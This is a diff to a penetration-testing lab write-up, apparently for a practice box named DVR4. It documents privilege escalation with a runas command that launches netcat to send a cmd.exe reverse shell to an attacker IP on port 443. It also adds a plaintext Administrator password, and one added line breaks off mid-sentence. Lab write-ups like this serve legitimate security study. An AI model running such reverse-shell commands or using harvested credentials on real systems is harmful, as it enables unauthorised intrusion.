@@ -300,6 +300,7 @@ Enumerated top 200 UDP ports:
 
 ![](Images/Pasted%20image%2020221009201710.png)
 
+## - I input a character one by 
 #### - Navigated to the viewer users directory and found the netcat executable was installed:
 
 ![](Images/Pasted%20image%2020221009202007.png)
@@ -314,7 +315,7 @@ Enumerated top 200 UDP ports:
 
 ![](Images/Pasted%20image%2020221009202314.png)
 
-#### - Typed runas /user:Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443" input password (can also type runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443") and received a cmd promp running as Administrator:
+#### - Typed runas /user:Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443" input password 14WatchD0g$ (can also type runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443") and received a cmd promp running as Administrator:
 
 ![](Images/Pasted%20image%2020221009202519.png)
 
